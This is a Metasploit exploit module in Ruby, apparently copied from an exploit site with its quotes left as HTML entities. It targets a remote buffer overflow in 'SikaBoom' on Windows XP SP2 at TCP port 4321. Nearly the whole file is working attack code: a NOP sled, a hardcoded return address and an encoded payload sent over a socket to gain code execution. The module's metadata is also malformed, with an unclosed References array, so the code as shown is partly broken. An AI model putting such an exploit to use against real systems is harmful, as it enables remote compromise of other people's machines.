# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp

      def initialize(info = {})
                super(update_info(info,
                        &#039;Name&#039;           => &#039;SikaBoom Remote Buffer overflow&#039;,
                        &#039;Description&#039;    => %q{
                                        This module exploits a buffer overflow in SikaBoom .
                                             },
                        &#039;Module&#039;         => [ &#039;Asesino04&#039; ],
      &#039;References&#039;     =>
        [
          [ &#039;Bug&#039;, &#039;http://1337day.com/exploit/16672&#039; ],

                        &#039;DefaultOptions&#039; =>
                                {
                                        &#039;EXITFUNC&#039; => &#039;process&#039;,
                                },
                        &#039;Payload&#039;        =>
                                {
                                        &#039;Space&#039;    => 268,
                                        &#039;BadChars&#039; => "\x00\xff",
                                },
                        &#039;Platform&#039;       => &#039;win&#039;,

                        &#039;Targets&#039;        =>
                                [
                                        [&#039;Windows XP SP2 En&#039;,
                                          { &#039;Ret&#039; => 0x5D38827C, &#039;Offset&#039; => 268 } ],
                                ],
                        &#039;DefaultTarget&#039; => 0,

                        &#039;Privileged&#039;     => false
                        ))

                        register_options(
                        [
                                Opt::RPORT(4321)
                        ], self.class)
       end

       def exploit
          connect

          junk = make_nops(target[&#039;Offset&#039;])
          sploit = junk + [target.ret].pack(&#039;V&#039;) + make_nops(50) + payload.encoded
          sock.put(sploit)

          handler
          disconnect

       end

end

